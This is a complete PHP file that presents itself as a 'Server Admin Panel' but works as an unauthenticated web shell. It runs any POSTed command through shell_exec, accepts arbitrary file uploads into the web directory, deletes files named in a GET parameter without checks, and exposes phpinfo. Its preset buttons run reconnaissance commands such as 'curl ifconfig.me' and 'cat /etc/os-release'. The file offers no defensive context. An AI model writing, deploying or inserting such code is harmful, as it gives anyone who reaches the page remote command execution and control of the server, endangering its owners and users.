<?php
session_start();

// File upload handling
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_FILES["file"])) {
    move_uploaded_file($_FILES["file"]["tmp_name"], __DIR__ . "/" . $_FILES["file"]["name"]);
}

// Command execution
$output = "";
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["command"])) {
    $cmd = $_POST["command"];
    $output = shell_exec($cmd);
}

// Function to fetch PHP info output
function get_phpinfo() {
    ob_start();
    phpinfo();
    $phpinfo = ob_get_contents();
    ob_end_clean();
    return $phpinfo;
}

// If AJAX request, return PHP info
if (isset($_GET['action']) && $_GET['action'] === 'get_phpinfo') {
    echo get_phpinfo();
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Admin Panel</title>
    <style>
        body { background: #2a2a2a; color: white; font-family: Arial, sans-serif; text-align: center; }
        .container { max-width: 800px; margin: auto; padding: 20px; border-radius: 10px; background: #3a3a3a; box-shadow: 0px 0px 10px #000; }
        select, button, input, textarea { width: 90%; padding: 10px; margin: 5px; border: none; border-radius: 5px; }
        select, button { background: #444; color: white; cursor: pointer; }
        button:hover { background: #666; }
        textarea { background: black; color: #4AF626; font-family: monospace; height: 700px; font-size: 10px; }
        .command-btns { margin: 10px 0; display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
        .command-btn { background: #444; color: white; padding: 8px 15px; border-radius: 20px; cursor: pointer; font-size: 14px; }
        .command-btn:hover { background: #666; }
        iframe { width: 100%; height: 600px; border: none; background: #333; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Server Management Panel</h2>

        <select id="menu" onchange="showSection()">
            <option value="terminal">Web Terminal</option>
            <option value="info">Server Info</option>
            <option value="files">File Manager</option>
            <option value="phpinfo">PHP Info</option>
        </select>

        <!-- Web Terminal -->
        <div id="terminal" class="section">
            <h3>Web Terminal</h3>
            <div class="command-btns">
                <button class="command-btn" onclick="setCommand('ifconfig')">ifconfig</button>
                <button class="command-btn" onclick="setCommand('hostname -I')">Local IP</button>
                <button class="command-btn" onclick="setCommand('curl ifconfig.me')">Public IP</button>
                <button class="command-btn" onclick="setCommand('uptime')">Uptime</button>
                <button class="command-btn" onclick="setCommand('df -h')">Disk Usage</button>
                <button class="command-btn" onclick="setCommand('top -n 1')">Top Process</button>
                <button class="command-btn" onclick="setCommand('ls')">List Files</button>
                <button class="command-btn" onclick="setCommand('ps aux')">Running Processes</button>
                <button class="command-btn" onclick="setCommand('free -m')">Memory Usage</button>
                <button class="command-btn" onclick="setCommand('cat /etc/os-release')">OS Info</button>
            </div>
            <form method="POST">
                <input type="text" name="command" id="command-input" value="<?php echo htmlspecialchars($cmd ?? ''); ?>" placeholder="Enter command..." required>
                <button type="submit">Run</button>
            </form>
            <textarea readonly><?php echo htmlspecialchars($output); ?></textarea>
        </div>

        <!-- Server Info -->
        <div id="info" class="section" style="display:none;">
            <h3>Server Information</h3>
            <pre><?php
                echo "OS: " . php_uname() . "\n";
                echo "PHP Version: " . phpversion() . "\n";
                echo "Server IP: " . $_SERVER['SERVER_ADDR'] . "\n";
                echo "Disk Free: " . round(disk_free_space("/") / 1073741824, 2) . " GB\n";
            ?></pre>
        </div>

        <!-- File Manager -->
        <div id="files" class="section" style="display:none;">
            <h3>File Manager</h3>
            
            <!-- File Upload Form -->
            <form action="pwradmin.php" method="POST" enctype="multipart/form-data">
                <input type="file" name="file" required>
                <button type="submit">Upload File</button>
            </form>
            
            <!-- File List -->
            <ul>
                <?php
                foreach (scandir(__DIR__) as $file) {
                    if ($file !== "." && $file !== "..") {
                        echo "<li>$file <a href='?delete=$file' style='color:red;'>[Delete]</a></li>";
                    }
                }
                ?>
            </ul>
            <?php
            if (isset($_GET['delete'])) {
                unlink(__DIR__ . "/" . $_GET['delete']);
                header("Location: pwradmin.php");
                exit();
            }
            ?>
        </div>

        <!-- PHP Info -->
        <div id="phpinfo" class="section" style="display:none;">
            <h3>PHP Info</h3>
            <a href="javascript:void(0);" onclick="openPHPInfoPopup();">Open PHP Info</a>

            <script>
                function openPHPInfoPopup() {
                    var popup = window.open('', '_blank', 'width=100,height=100');
                    popup.document.write('<html><head><title>PHP Info</title></head><body>');
                    popup.document.write('<div id="php-info-content">Loading PHP info...</div>');
                    popup.document.write('</body></html>');
                    popup.document.close();

                    fetch('?action=get_phpinfo')
                        .then(response => response.text())
                        .then(data => {
                            popup.document.getElementById('php-info-content').innerHTML = data;
                            popup.document.body.style.height = 'auto';
                        })
                        .catch(error => {
                            popup.document.getElementById('php-info-content').innerHTML = 'Error loading PHP info';
                        });
                }
            </script>
        </div>
    </div>

    <script>
        function showSection() {
            let sections = document.querySelectorAll(".section");
            sections.forEach(sec => sec.style.display = "none");
            document.getElementById(document.getElementById("menu").value).style.display = "block";
        }

        function setCommand(command) {
            // Set the command into the input field
            document.getElementById('command-input').value = command;
        }

        // Set default to show terminal on page load
        document.addEventListener("DOMContentLoaded", function() {
            showSection();
            document.getElementById("menu").value = "terminal";
            showSection();
        });
    </script>
</body>
</html>
